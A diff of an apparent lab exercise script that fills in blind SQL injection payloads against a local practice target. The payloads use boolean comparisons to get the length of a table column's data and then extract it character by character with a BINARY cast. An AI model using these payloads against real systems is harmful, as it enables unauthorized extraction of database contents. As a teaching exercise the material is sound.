@@ -6,12 +6,14 @@ TARGET = 'http://127.0.0.1:1337/blind-based'
 def get_length(post_param:str, column_name: str, table_name: str, suffix: str = '') -> int:
     """
         Gets the length of the data that is being dumped
+
         Parameters:
             post_param: The name of the POST request parameter 
                         (use BurpSuite, inspect on your browser or read the HTML code to get this)
             column_name: The name of the column to dump from the table
             table_name: The name of the table to dump data from
             suffix: Any additional statements to append to the query
+
         Returns:
             The length for the data that is being dumped
     """
@@ -28,7 +30,7 @@ def get_length(post_param:str, column_name: str, table_name: str, suffix: str = 
     # function to combine all of the rows for the dumped column into a
     # single row.
     ##
-    payload = "FILL ME IN {column_name} {table_name} {suffix} {test_len}".format(
+    payload = "Classic' and length((SELECT group_concat({column_name}) FROM {table_name} {suffix}))={test_len}#".format(
         column_name=column_name,
         table_name=table_name,
         suffix=suffix,
@@ -54,12 +56,14 @@ def try_char(post_param: str, payload: str, index: int, char: str) -> tuple:
 def exploit(post_param:str, column_name: str, table_name: str, suffix: str = '') -> list:
     """
         Exploits the Error-based SQLi vulnerability for the SQLi lab
+
         Parameters:
             post_param: The name of the POST request parameter 
                         (use BurpSuite, inspect on your browser or read the HTML code to get this)
             column_name: The name of the column to dump from the table
             table_name: The name of the table to dump data from
             suffix: Any additional statements to append to the query
+
         Returns:
             A list of the dumped values from the database.
     """
@@ -82,7 +86,7 @@ def exploit(post_param:str, column_name: str, table_name: str, suffix: str = '')
     # Don't forget that string comparisons are CASE INSENSITVE and you
     # need to fix it.
     ##
-    payload = "FILL ME IN {column_name} {table_name} {suffix} {index} {char}".format(
+    payload = "Classic' and CAST(substring((SELECT group_concat({column_name}) FROM {table_name} {suffix}),{index},1) AS BINARY)=CAST('{char}' AS BINARY)#".format(
         column_name=column_name,
         table_name=table_name,
         index='{index}',
